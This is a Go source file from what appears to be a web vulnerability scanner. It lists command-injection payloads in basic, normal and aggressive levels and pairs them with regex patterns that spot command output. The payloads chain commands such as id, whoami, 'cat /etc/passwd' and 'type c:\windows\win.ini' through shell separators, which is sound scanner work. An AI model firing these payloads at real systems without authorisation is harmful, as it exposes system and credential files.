package payloads

import "regexp"

// CmdInjPayloads contains Command Injection payloads organized by level
// Level 1 = Basic, Level 2 = Normal, Level 3 = Aggressive
var CmdInjPayloads = map[int][]string{
	1: { // Basic
		"; id",
		"| id",
		"&& id",
	},
	2: { // Normal
		"; id",
		"| id",
		"&& id",
		"|| id",
		"`id`",
		"$(id)",
		"; ls -la",
		"| cat /etc/passwd",
		"; whoami",
		"& ping -c 5 127.0.0.1 &",
	},
	3: { // Aggressive
		"; id",
		"| id",
		"&& id",
		"|| id",
		"`id`",
		"$(id)",
		"; ls -la",
		"| cat /etc/passwd",
		"; whoami",
		"& ping -c 5 127.0.0.1 &",
		"\n/bin/cat /etc/passwd",
		"a]); system('id');//",
		"| type c:\\windows\\win.ini",
		"& dir c:\\ &",
		"; sleep 5",
		"| sleep 5",
		"%0aid",
		"';id;'",
		"\"|id;\"",
	},
}

// CmdOutputPatterns contains regex patterns to detect command output
var CmdOutputPatterns = []*regexp.Regexp{
	regexp.MustCompile(`uid=\d+.*gid=\d+`),             // id command
	regexp.MustCompile(`root:.*:0:0:`),                 // /etc/passwd
	regexp.MustCompile(`\[boot loader\]`),              // boot.ini
	regexp.MustCompile(`Directory of [A-Z]:\\`),        // dir command
	regexp.MustCompile(`total \d+`),                    // ls command
	regexp.MustCompile(`(root|www-data|apache|nginx)`), // whoami
}

// GetCmdInjPayloads returns command injection payloads for the given level
func GetCmdInjPayloads(level int) []string {
	if p, ok := CmdInjPayloads[level]; ok {
		return p
	}
	return CmdInjPayloads[2] // Default to normal
}

// MatchesCmdOutput checks if body matches any command output pattern
func MatchesCmdOutput(body string) (bool, string) {
	for _, pattern := range CmdOutputPatterns {
		if pattern.MatchString(body) {
			return true, pattern.String()
		}
	}
	return false, ""
}
